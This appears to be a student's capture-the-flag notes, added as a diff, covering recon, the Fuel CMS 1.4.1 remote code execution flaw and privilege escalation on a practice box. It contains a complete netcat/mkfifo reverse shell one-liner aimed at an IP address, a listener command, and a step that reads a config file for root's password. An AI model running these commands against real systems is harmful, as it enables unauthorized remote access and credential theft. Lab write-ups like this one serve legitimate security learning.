@@ -1,0 +1,32 @@
+Scan port
+
+port 80
+service Apace httpd 2.4.18
+OS Ubuntu
+
+--------------------
+Scan Hidden Directories
+
+/robots.txt/fuel
+
+-------------------
+Database
+
+Fuel CMS
+vuln fuel CMS 1.4.1 - Remote Code Execution (1)
+
+--------------------
+Exploit
+
+Code to connect with web server: exploit.py
+reverse shell: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.88.80 8080>/tmp/f
+open post on localhost: nc -nlvp 8080
+
+-------------------
+privilege encapsulation
+
+change the database configuration found in fuel/application/config/database.php to include your hostname (e.g. localhost), username, password and the database to match the new database you created.
+cat this file to take root's password
+
+
+
